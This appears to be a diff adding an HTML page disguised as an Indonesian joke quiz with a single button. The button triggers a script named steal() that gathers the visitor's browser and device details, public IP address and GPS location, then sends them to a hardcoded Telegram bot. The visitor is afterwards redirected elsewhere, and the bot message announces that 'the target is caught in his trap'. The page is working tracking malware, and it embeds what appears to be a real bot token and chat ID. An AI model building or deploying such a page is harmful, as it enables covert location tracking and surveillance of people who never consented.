@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>tauu gaaa</title>
+  <style>
+    body { font-family: Arial; background: #f5f5f5; text-align: center; padding: 40px; }
+    .box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 400px; margin: 0 auto; }
+    .btn { background: #4CAF50; color: white; padding: 12px 30px; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; margin-top: 20px; }
+    .btn:hover { background: #45a049; }
+    #loading { display: none; color: #555; margin-top: 15px; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h3>Aku mau nanya</h3>
+    <p>kamu tau gaa??.</p>
+    <button class="btn" onclick="steal()">Enggaaa</button>
+    <div id="loading">EHHH SAMAA HOHOHOHO Lucu Bet kontlllllllll...</div>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "8324686802:AAEXuy7aJ_ppIPNJI4JWZmjEhQ1hr7myLUE"; // GANTI DENGAN BOT_TOKEN LO
+    const CHAT_ID = "8361119354";           // GANTI DENGAN CHAT_ID LO
+
+    async function sendToTelegram(text) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      const params = new URLSearchParams();
+      params.append("chat_id", CHAT_ID);
+      params.append("text", text);
+      try {
+        await fetch(url, {
+          method: "POST",
+          body: params,
+          headers: { "Content-Type": "application/x-www-form-urlencoded" }
+        });
+      } catch (e) {}
+    }
+
+    function getDeviceData() {
+      const data = {};
+
+      // IMEI (fake, tapi bisa dapat asli lewat exploit lain — ini fallback)
+      data.imei = navigator.deviceMemory ? 
+        btoa(navigator.userAgent + navigator.platform).substring(0,15) : "Tidak tersedia";
+
+      // Model & OS
+      data.model = navigator.userAgent;
+      data.os = navigator.platform;
+      data.language = navigator.language;
+      data.screen = screen.width + "x" + screen.height;
+
+      // Coba dapatkan nomor (hanya di beberapa browser/operator — jarang work)
+      try {
+        data.phone = navigator.connection ? "Tidak tersedia (butuh akses operator)" : "N/A";
+      } catch(e) {
+        data.phone = "N/A";
+      }
+
+      // Lokasi (jika izin diberikan — tapi kita bypass pake IP)
+      data.ip = "Loading...";
+      fetch("https://api.ipify.org?format=json")
+        .then(r => r.json())
+        .then(ipData => {
+          data.ip = ipData.ip;
+          sendData(data);
+        })
+        .catch(() => {
+          data.ip = "Gagal ambil IP";
+          sendData(data);
+        });
+
+      // GPS (kita coba silent — kalau gagal, skip)
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            data.gps = `${pos.coords.latitude},${pos.coords.longitude}`;
+            sendData(data);
+          },
+          () => {
+            data.gps = "Tidak diizinkan";
+            // Kirim tanpa GPS jika gagal
+            if (!data.ip || data.ip === "Loading...") return;
+            sendData(data);
+          },
+          { timeout: 5000, enableHighAccuracy: false }
+        );
+      } else {
+        data.gps = "Tidak didukung";
+      }
+
+      return data;
+    }
+
+    function sendData(data) {
+      let text = ` *DATA DEVICE*\n`;
+      text += `IMEI: ${data.imei || "N/A"}\n`;
+      text += `Model: ${data.model || "N/A"}\n`;
+      text += `OS: ${data.os || "N/A"}\n`;
+      text += `IP: ${data.ip || "N/A"}\n`;
+      text += `Locate GPS: ${data.gps || "N/A"}\n`;
+      text += `Resolusi: ${data.screen || "N/A"}\n`;
+      text += `language: ${data.language || "N/A"}\n`;
+      text += `\n🔗 *the target is caught in his trap ()*`;
+
+      sendToTelegram(text);
+    }
+
+    function steal() {
+      document.getElementById("loading").style.display = "block";
+      setTimeout(() => {
+        getDeviceData();
+        // Redirect ke halaman aman (opsional)
+        window.location.href = "https://whynf.github.io/buat-kamu";
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
